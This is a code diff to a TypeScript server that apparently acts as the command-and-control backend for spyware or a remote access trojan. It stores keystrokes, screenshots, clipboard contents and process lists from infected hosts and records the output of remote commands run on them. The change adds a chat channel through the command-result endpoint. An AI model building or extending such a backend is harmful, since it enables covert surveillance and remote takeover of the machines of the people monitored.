@@ -6,7 +6,7 @@ import { eq, and, desc } from "drizzle-orm";
 import {
   db, hostsTable, keystrokesTable, screenshotsTable,
   remoteCommandsTable, systemInfoTable, processesTable,
-  windowsListTable, eventsTable, clipboardTable,
+  windowsListTable, eventsTable, clipboardTable, chatMessagesTable,
 } from "@workspace/db";
 import { resolveToken, tokenForHost, screenshotData } from "../../lib/omega-store";
 import { serializeDates } from "../../lib/serialize";
@@ -102,9 +102,17 @@ router.post("/result", async (req: Request, res: Response): Promise<void> => {
   if (!token || cmdId === undefined) { res.status(400).json({ error: "token and cmdId required" }); return; }
   const hostId = resolveToken(token);
   if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }
+  const resultStr = String(result ?? "");
   await db.update(remoteCommandsTable)
-    .set({ status: "executed", result: String(result ?? ""), executedAt: new Date() })
+    .set({ status: "executed", result: resultStr, executedAt: new Date() })
     .where(and(eq(remoteCommandsTable.id, Number(cmdId)), eq(remoteCommandsTable.hostId, hostId)));
+
+  // If this is a chat reply, store it as an inbound message so chat.tsx picks it up
+  if (resultStr.startsWith("[CHAT_REPLY]:")) {
+    const replyText = resultStr.substring("[CHAT_REPLY]:".length);
+    await db.insert(chatMessagesTable).values({ hostId, message: replyText, direction: "in" });
+  }
+
   const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, hostId));
   await db.insert(eventsTable).values({
     hostId,
@@ -112,7 +120,7 @@ router.post("/result", async (req: Request, res: Response): Promise<void> => {
     hostLabel: host?.label ?? null,
     category: "Command",
     action: "Command result received",
-    details: String(result ?? "").substring(0, 200),
+    details: resultStr.substring(0, 200),
     severity: "info",
   });
   res.json({ ok: true });
